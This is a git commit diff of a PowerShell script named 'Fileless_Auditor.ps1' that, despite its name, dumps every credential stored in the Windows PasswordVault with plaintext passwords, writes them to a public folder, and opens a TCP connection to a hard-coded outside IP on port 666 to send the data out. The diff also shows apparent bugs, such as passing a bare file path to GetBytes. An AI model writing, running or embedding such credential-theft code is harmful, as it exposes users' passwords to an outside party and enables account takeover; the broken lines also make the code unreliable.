aecc93e27d8ce77b903b840697e27e41d208b0da
Savitar407 <42724977+Savitar407@users.noreply.github.com>
2021-02-22 20:08:43 -0500

    Update Fileless_Auditor.ps1

--- Fileless_Auditor.ps1
+++ Fileless_Auditor.ps1
@@ -1,8 +1,9 @@
 [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime] 
-message = (new-object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword(); $_ } -OutVariable message
+(new-object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword(); $_ } >> C:\Users\Public\passwords.txt
 $port=666
 $remoteHost = "209.151.149.234"
 $socket = new-object System.Net.Sockets.TcpClient($remoteHost, $port)
-$data = [System.Text.Encoding]::ASCII.GetBytes($message)
+$data = [System.Text.Encoding]::ASCII.GetBytes(C:\Users\Public\passwords.txt)
 $stream = $socket.GetStream()
 $stream.Write($data, 0, $data.Length)
+$stream.close()
